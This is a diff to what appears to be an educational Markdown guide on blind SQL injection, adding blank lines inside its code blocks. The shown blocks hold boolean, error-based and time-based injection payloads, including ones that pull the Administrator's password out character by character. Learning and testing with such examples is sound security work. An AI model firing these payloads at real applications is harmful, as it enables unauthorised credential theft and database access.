@@ -124,9 +124,13 @@ Blind SQL Injection is an attack where an application is vulnerable to SQL injec
 
 ```sql
 …xyz' AND '1'='1 -- Returns True
+
 …xyz' AND '1'='2 -- Returns False
+
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm' -- Returns True
+
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't' -- Returns False
+
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' -- Returns True
 ```
 
@@ -154,6 +158,7 @@ Cases where error messages help extract or infer sensitive data, even in blind c
 
 ```sql
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' -- No Error
+
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- Error: Divide by zero
 ```
 
@@ -175,6 +180,7 @@ Using `CAST()` as `int` to generate errors:
 
 ```sql
 ' AND CAST((SELECT 1) AS int)-- -- Generates an error
+
 ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 ```
 
@@ -184,6 +190,7 @@ Using `CAST()` as `int` to generate errors:
 
 ```sql
 '; IF (1=2) WAITFOR DELAY '0:0:10'--
+
 '; IF (1=1) WAITFOR DELAY '0:0:10'--
 ```
 
